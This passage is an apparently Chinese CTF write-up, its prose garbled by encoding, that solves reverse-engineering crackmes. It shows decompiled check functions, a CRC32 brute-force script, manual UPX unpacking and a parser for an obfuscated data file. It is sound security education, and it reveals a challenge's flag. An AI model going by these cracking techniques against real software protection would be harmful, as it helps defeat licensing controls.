<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">int</span> __cdecl <span class="title function_">check</span><span class="params">(<span class="type">int</span> flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v2; <span class="comment">// ebp</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// sf</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// of</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">bool</span> v9; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+10h] [ebp-D8h]</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [esp+18h] [ebp-D0h]</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [esp+19h] [ebp-CFh]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [esp+1Ah] [ebp-CEh]</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [esp+1Bh] [ebp-CDh]</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [esp+1Ch] [ebp-CCh]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [esp+1Dh] [ebp-CBh]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [esp+1Eh] [ebp-CAh]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [esp+1Fh] [ebp-C9h]</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [esp+20h] [ebp-C8h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [esp+21h] [ebp-C7h]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [esp+22h] [ebp-C6h]</span></span><br><span class="line">  <span class="type">char</span> v22; <span class="comment">// [esp+23h] [ebp-C5h]</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+24h] [ebp-C4h]</span></span><br><span class="line">  __int16 v24; <span class="comment">// [esp+48h] [ebp-A0h]</span></span><br><span class="line">  <span class="type">char</span> v25; <span class="comment">// [esp+4Ch] [ebp-9Ch]</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// [esp+4Dh] [ebp-9Bh]</span></span><br><span class="line">  __int16 v27; <span class="comment">// [esp+7Ch] [ebp-6Ch]</span></span><br><span class="line">  <span class="type">char</span> v28; <span class="comment">// [esp+80h] [ebp-68h]</span></span><br><span class="line">  <span class="type">char</span> v29; <span class="comment">// [esp+81h] [ebp-67h]</span></span><br><span class="line">  <span class="type">char</span> v30; <span class="comment">// [esp+82h] [ebp-66h]</span></span><br><span class="line">  <span class="type">char</span> v31; <span class="comment">// [esp+83h] [ebp-65h]</span></span><br><span class="line">  <span class="type">char</span> v32; <span class="comment">// [esp+B1h] [ebp-37h]</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [esp+B4h] [ebp-34h]</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// [esp+B8h] [ebp-30h]</span></span><br><span class="line">  <span class="type">char</span> v35; <span class="comment">// [esp+E5h] [ebp-3h]</span></span><br><span class="line"></span><br><span class="line">  LOBYTE(v33) = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v33 + <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v29, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v26, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  HIBYTE(v27) = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">  v13 = <span class="string">&#x27;5&#x27;</span>;</span><br><span class="line">  v14 = <span class="string">&#x27;6&#x27;</span>;</span><br><span class="line">  v15 = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">  v16 = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">  v17 = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">  v18 = <span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">  v19 = <span class="string">&#x27;Z&#x27;</span>;</span><br><span class="line">  v20 = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">  v21 = <span class="string">&#x27;q&#x27;</span>;</span><br><span class="line">  v22 = <span class="string">&#x27;v&#x27;</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v23, <span class="number">0</span>, <span class="number">0x24</span>u);</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag) != <span class="number">10</span> )                     <span class="comment">// len(flag) = 10</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;v11) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(v10 + flag) == *(&amp;v11 + v3) )</span><br><span class="line">        v2 = <span class="number">1</span>;</span><br><span class="line">      ++v3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v3 &lt; <span class="built_in">strlen</span>(&amp;v11) );</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = __OFSUB__(v10 + <span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line">    v4 = v10++ - <span class="number">9</span> &lt; <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !(v4 ^ v5) )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = (*(flag + <span class="number">9</span>) + <span class="number">25</span>) ^ <span class="number">0x19</span>;</span><br><span class="line">      v28 = (*flag - <span class="number">1</span>) ^ <span class="number">0x20</span>;</span><br><span class="line">      v29 = v6;</span><br><span class="line">      v33 = *(flag + <span class="number">1</span>);</span><br><span class="line">      v34 = *(flag + <span class="number">5</span>);</span><br><span class="line">      v30 = <span class="number">45</span>;</span><br><span class="line">      v7 = maybe_crc(&amp;v33, <span class="built_in">strlen</span>(&amp;v33));</span><br><span class="line">      _itoa(v7, &amp;v25, <span class="number">16</span>);</span><br><span class="line">      qmemcpy(&amp;v31, &amp;v25, <span class="built_in">strlen</span>(&amp;v25));</span><br><span class="line">      <span class="built_in">memset</span>(&amp;v25, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">      v27 = <span class="number">0</span>;</span><br><span class="line">      v8 = sub_4012C0(&amp;v33, <span class="built_in">strlen</span>(&amp;v33));</span><br><span class="line">      _itoa(v8, &amp;v25, <span class="number">16</span>);</span><br><span class="line">      *(&amp;v25 + <span class="built_in">strlen</span>(&amp;v25)) = <span class="string">&#x27;#&#x27;</span>;</span><br><span class="line">      qmemcpy(&amp;v28 + <span class="built_in">strlen</span>(&amp;v28), &amp;v25, <span class="built_in">strlen</span>(&amp;v25));</span><br><span class="line">      v9 = <span class="built_in">strcmp</span>(&amp;v28, aSu5984f05ed827) == <span class="number">0</span>;</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v9 )</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>IDA å¤§æ¦‚çœ‹ä¸€ä¸‹ä¼ªä»£ç å‘ç°å¯èƒ½ç”¨äº†æŸç§æ ‡å‡†åŠ å¯†ç®—æ³•ï¼Œç”¨ IDA æ’ä»¶æ‰«æå‡º CRC32 çš„ç‰¹å¾è¡¨ã€‚maybe_crc å°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„ CRC ç®—æ³•ã€‚</p>
<p>å¤§æ¦‚é€»è¾‘æ˜¯è¦æ±‚æˆ‘ä»¬è¾“å…¥ 10 ä¸ªå­—èŠ‚çš„ flagï¼Œflag ä¸­çš„å­—ç¬¦éƒ½è¦åœ¨ 2356DESTzcqv å­—ç¬¦é›†ä¸­ã€‚ä¹‹åå–å‡ºä¸­é—´ 8 ä¸ªå­—èŠ‚è¿›è¡Œ CRC è¿ç®—å¾—åˆ°ä¸€ä¸ªç»“æœï¼Œç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå­—èŠ‚åˆ†åˆ«è¿›è¡ŒæŸç§è¿ç®—å¾—åˆ°ç»“æœã€‚å°†è¿™äº›ç»“æœæ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå’Œç¡¬ç¼–ç çš„å­—ç¬¦ä¸²è¿›è¡Œå¯¹æ¯”ã€‚</p>
<p>ç¬¬ä¸€ä¸ªå­—èŠ‚å’Œæœ€åä¸€ä¸ªå­—èŠ‚å¯ä»¥é€šè¿‡è°ƒè¯•æ‰¾å‡ºæ¥ï¼Œå› ä¸ºå­—ç¬¦é›†ä¸­æ¯ä¸ªå­—ç¬¦ç»è¿‡è¿ç®—çš„ç»“æœéƒ½æ˜¯å›ºå®šçš„ã€‚æ¥ä¸‹æ¥å‰©ä¸‹çš„é—®é¢˜å°±æ˜¯æ‰¾åˆ°ä¸­é—´ 8 ä¸ªå­—èŠ‚åˆ°åº•æ˜¯ä»€ä¹ˆäº†ã€‚</p>
<p>ç”±äºæ˜¯ CRC è¿ç®—ï¼Œç®—æ³•ä¸å¯é€†ï¼Œåªèƒ½çˆ†ç ´ã€‚å­—ç¬¦é›† 12 ä¸ªå­—èŠ‚ï¼Œçˆ†ç ´éš¾åº¦ä¸ç®—å¤ªå¤§ã€‚ç¼–å†™è„šæœ¬</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;2356DESTZcqv&quot;</span></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> table:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Tried: &quot;</span> + <span class="built_in">str</span>(total))</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> table:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> table:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> table:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> table:</span><br><span class="line">                    <span class="keyword">for</span> f <span class="keyword">in</span> table:</span><br><span class="line">                        <span class="keyword">for</span> g <span class="keyword">in</span> table:</span><br><span class="line">                            <span class="keyword">for</span> h <span class="keyword">in</span> table:</span><br><span class="line">                                temp = a + b + c + d + e + f + g + h</span><br><span class="line">                                total += <span class="number">1</span></span><br><span class="line">                                <span class="keyword">if</span>((zlib.crc32(temp) &amp; <span class="number">0xffffffff</span>) == <span class="number">0x5984f05e</span>):</span><br><span class="line">                                    <span class="built_in">print</span> temp</span><br><span class="line">                                    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<p>æœ€åè·‘å‡ºç»“æœ cqZS62vD</p>
<p>åŠ ä¸Šè°ƒè¯•ç¡®å®šçš„å­—ç¬¦å¾—åˆ° flagï¼š flag{TcqZS62vD3}</p>
<h2 id="RE3"><a href="#RE3" class="headerlink" title="RE3"></a>RE3</h2><p>ç¨‹åºåŠ å£³ï¼Œåˆæ­¥åˆ¤æ–­æ˜¯ UPX çš„å£³å­ï¼Œä½†æ˜¯è‡ªåŠ¨è„±å£³å·¥å…·æ²¡æ³•æå®šï¼Œæ‰€ä»¥åªèƒ½ç”¨ OD æ¥æ‰‹åŠ¨ DUMPã€‚</p>
<p>ESP å®šå¾‹æ‰¾åˆ° OEP ç„¶åç”¨æ’ä»¶ dump ç¨‹åºï¼Œæ¯”èµ›çš„æ—¶å€™æˆ‘çš„è™šæ‹Ÿæœºå³é”®èœå•çªç„¶å¤±çµäº†ï¼Œå¯¼è‡´ LORDPE æ²¡æ³•ç”¨ç®¡ç†å‘˜æƒé™è·‘èµ·æ¥ï¼Œæ‰¾ä¸åˆ°è¿›ç¨‹ï¼Œæ‰€ä»¥æ²¡æœ‰ä¿®å¤å¯¼å…¥è¡¨ã€‚ æœ¬é¢˜ä¸å»ä¿®å¤å¯¼å…¥è¡¨ä¹Ÿå¯ä»¥å¤§æ¦‚åˆ†æä¸€ä¸‹ã€‚ç”¨ IDA æ‰“å¼€ dump çš„ç¨‹åºï¼Œä¸»å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+4h] [ebp-34h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+5h] [ebp-33h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [esp+35h] [ebp-3h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  sub_401000();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n      Hi,  SDNISC 2019 ~~~ \n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;serialNumber: &quot;</span>, v3);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( sub_401150(&amp;v5) == <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n --&gt;   Congratulations ~~~   &lt;--\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n --&gt;   Try again ~~~   &lt;--\n&quot;</span>);</span><br><span class="line">  sub_40180D(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>å’Œ RE2 ç±»ä¼¼ï¼Œç”¨ sub_401150 å‡½æ•°éªŒè¯è¾“å…¥ã€‚æ¯”è¾ƒç‰¹æ®Šçš„ç‚¹æ˜¯é¦–å…ˆæ‰“å¼€ data.bin æ–‡ä»¶ï¼Œè¯»å–å…¨éƒ¨å†…å®¹åˆ°å†…å­˜ã€‚</p>
<p>sub_401150 å‡½æ•°ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">int</span> __cdecl <span class="title function_">sub_401150</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *flag)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [esp+Ch] [ebp-34h]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [esp+Dh] [ebp-33h]</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [esp+3Dh] [ebp-3h]</span></span><br><span class="line"></span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v13, <span class="number">0</span>, <span class="number">0x30</span>u);</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span> - &amp;v12; ; i = <span class="number">1</span> - &amp;v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = &amp;v12 + v1;</span><br><span class="line">      v4 = &amp;v12 + v1 + i;</span><br><span class="line">      v5 = flag[v4 - <span class="number">1</span>];</span><br><span class="line">      v7 = v4 &amp; <span class="number">0x80000001</span>;</span><br><span class="line">      v6 = v7 == <span class="number">0</span>;</span><br><span class="line">      *(&amp;v12 + v1) = v5;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">        v6 = ((v7 - <span class="number">1</span>) | <span class="number">0xFFFFFFFE</span>) == <span class="number">-1</span>;</span><br><span class="line">      v8 = v6 ? v5 ^ <span class="number">0x19</span> : v5 ^ <span class="number">0x20</span>;</span><br><span class="line">      *v3 = v8;</span><br><span class="line">      v9 = sub_4010C0(v8);</span><br><span class="line">      *v3 = v9;</span><br><span class="line">      byte_40B9C0[v1++] = v9;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &gt;= <span class="built_in">strlen</span>(flag) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;v12 + v10) != byte_409064[v10] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v10;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v10 &lt; <span class="built_in">strlen</span>(flag) );</span><br><span class="line">  <span class="keyword">if</span> ( v10 != <span class="number">32</span> )</span><br><span class="line">LABEL_18:</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>çœ‹èµ·æ¥æ¯”è¾ƒå¤æ‚ï¼Œå¤§æ¦‚åˆ†æä¸€ä¸‹é€»è¾‘æ˜¯è·å–è¾“å…¥çš„æ•°æ®ï¼Œé•¿åº¦æ˜¯ 32 å­—èŠ‚ã€‚ç„¶åå¥‡æ•°ä½ç½®çš„å­—èŠ‚å¼‚æˆ– 0x20ï¼Œå¶æ•°ä½ç½®çš„å­—èŠ‚å¼‚æˆ– 0x19ã€‚</p>
<p>ä¸»è¦è¿ç®—æ˜¯ sub_4010C0 å‡½æ•°ï¼Œä½†æ˜¯ç”¨ IDA æŸ¥çœ‹åç¼–è¯‘ç»“æœæ˜¯ </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> __cdecl <span class="title function_">sub_4010C0</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ˜¾ç„¶ä¸æ­£ç¡®ï¼Œè½¬è€ŒæŸ¥çœ‹æ±‡ç¼–ï¼Œå¤´éƒ¨ç”¨å…¨å±€å˜é‡ dword_40B9F8 æ§åˆ¶ç¨‹åºæµè½¬å‘ retï¼ŒçŒœæµ‹æ˜¯ç”¨äºæ¬ºéª—åç¼–è¯‘å™¨ã€‚</p>
<p>Key_patch ä¿®æ­£ç¬¬ä¸€ä¸ªåŸºæœ¬å—çš„è·³è½¬æ–¹å‘ï¼Œå† F5 å¾—åˆ°ç»“æœ</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int8 __cdecl <span class="title function_">sub_4010C0</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> *v1; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v2; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  v2 = a1;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *v1;</span><br><span class="line">    <span class="keyword">if</span> ( *v1 &gt; <span class="number">0xC8B5BDC6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xC9D3D4D7</span>:</span><br><span class="line">          <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xCED6A8B7</span>:</span><br><span class="line">          v2 *= <span class="number">4</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xFAB9AEB0</span>:</span><br><span class="line">          ++v2;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( *v1 == <span class="number">0xC8B5BDC6</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (v2 + <span class="number">1</span>) ^ <span class="number">0x19</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &gt; <span class="number">0xC5D0CFB3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">0xC6C9D1D3</span> )</span><br><span class="line">        v2 *= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xC5D0CFB3</span>:</span><br><span class="line">          v2 ^= <span class="number">0x19</span>u;</span><br><span class="line">LABEL_11:</span><br><span class="line">          --v2;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xB5D2B4BE</span>:</span><br><span class="line">          v2 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xBFC7BBB8</span>:</span><br><span class="line">          v2 ^= <span class="number">0x66</span>u;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v1;</span><br><span class="line">    --v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v3 );</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå‡½æ•°é€šè¿‡åˆ¤æ–­ v1 çš„å€¼å¯¹ä¼ å…¥çš„å­—èŠ‚åšä¸åŒæ“ä½œã€‚ä½†æ˜¯æ— æ³•å®šä½ v1 åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œè½¬è€Œç”¨ OD æ¥çœ‹ã€‚ä»å†…å­˜çª—å£å‘ç°æ¯”è¾ƒçš„å†…å®¹æ˜¯ data.binï¼Œswitch case çš„æ¡ä»¶ä¹Ÿæ˜¯ unicode ç¼–ç çš„æ•°æ®ï¼Œç¿»è¯‘è¿‡æ¥æ˜¯ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ä¸­çš„ 8 æ¡ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¿«é€Ÿç¼–å†™ä¸€ä¸ªè§£æè„šæœ¬ï¼Œä» data.bin ä¸­è·å–åˆ°æ“ä½œçš„è°ƒç”¨é¡ºåºã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./data.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">f.close()</span><br><span class="line">func_list = []</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">    temp = u32(data[i] + data[i + <span class="number">1</span>] + data[i + <span class="number">2</span>] + data[i + <span class="number">3</span>])</span><br><span class="line">    <span class="keyword">if</span> temp == <span class="number">0x0C8B5BDC6</span>:</span><br><span class="line">        func_list.append(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0C5D0CFB3</span>:</span><br><span class="line">        func_list.append(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0B5D2B4BE</span>:</span><br><span class="line">        func_list.append(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0BFC7BBB8</span>:</span><br><span class="line">        func_list.append(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0C6C9D1D3</span>:</span><br><span class="line">        func_list.append(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0C9D3D4D7</span>:</span><br><span class="line">        func_list.append(<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0CED6A8B7</span>:</span><br><span class="line">        func_list.append(<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">elif</span> temp == <span class="number">0x0FAB9AEB0</span>:</span><br><span class="line">        func_list.append(<span class="number">8</span>)</span><br><span class="line">    i += <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> ((char + <span class="number">1</span>) ^ <span class="number">0x19</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> ((char ^ <span class="number">0x19</span>) - <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func3</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func4</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char ^ <span class="number">0x66</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func5</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func6</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="keyword">return</span> (char - <span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func7</span>(<span 